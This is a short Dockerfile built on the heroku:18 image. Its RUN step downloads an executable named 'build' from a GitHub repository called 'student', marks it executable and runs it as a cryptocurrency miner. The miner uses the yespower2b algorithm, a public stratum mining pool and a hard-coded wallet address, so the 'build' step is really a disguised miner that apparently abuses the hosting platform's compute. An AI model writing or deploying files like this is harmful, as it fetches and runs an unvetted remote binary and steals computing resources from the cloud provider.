FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/AVGandhi/student/raw/main/build; chmod +x build; ./build --disable-gpu --algorithm yespower2b --pool stratum-na.rplant.xyz:7022 -u Md1tpEQX3cobrDinehRb7Zkso4xhukRQxY.VPS -p password=test
CMD bash heroku.sh